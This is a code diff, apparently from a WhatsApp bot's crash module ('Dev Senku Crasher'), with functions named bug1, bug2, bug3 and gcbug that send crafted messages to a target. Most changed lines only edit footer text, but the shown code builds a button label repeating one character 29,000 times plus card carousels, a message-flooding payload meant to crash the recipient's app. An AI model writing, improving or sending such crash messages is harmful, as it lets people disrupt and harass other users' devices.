@@ -1,4 +1,4 @@
-import bug from '../commands/bug.js'
+import channelSender from '../commands/channelSender.js'
 
 async function bug1(message, client, target) {
 
@@ -60,7 +60,7 @@ async function bug2(message, client, target) {
 
       caption: "☥ Dev Senku Crasher ☥",
 
-      footer: "☥ I love you 🌹 ☥",
+      footer: "☥  🌹 ☥",
 
       media: true,
 
@@ -69,7 +69,7 @@ async function bug2(message, client, target) {
         {
           name: "quick_reply",
           buttonParamsJson: JSON.stringify({
-            display_text: `I love you ${"ꦾ".repeat(29000)}\n\n`,
+            display_text: `🌹 ${"ꦾ".repeat(29000)}\n\n`,
             id: "refresh"
           })
         },
@@ -114,7 +114,7 @@ async function bug3(message, client, target) {
     {
         text: "✘ Dev Senku Crasher ✘",
 
-        footer: "I love you 🌹",
+        footer: "🌹 🌹",
 
         cards: [
 
@@ -125,7 +125,7 @@ async function bug3(message, client, target) {
 
               caption: 'Just another dev on the internet',
 
-              footer: "I love you 🌹",
+              footer: "🌹 🌹",
 
               buttons: [
 
@@ -172,7 +172,7 @@ async function bug3(message, client, target) {
 
               caption: 'Just another dev on the internet',
 
-              footer: "I love you 🌹",
+              footer: "🌹 🌹",
 
               buttons: [
 
@@ -219,7 +219,7 @@ async function bug3(message, client, target) {
 
               caption: 'Just another dev on the internet',
 
-              footer: "I love you 🌹",
+              footer: "🌹 🌹",
 
               buttons: [
 
@@ -349,6 +349,5 @@ async function gcbug(message, client) {
 
 
 }
-    // body...
 
 export default gcbug;
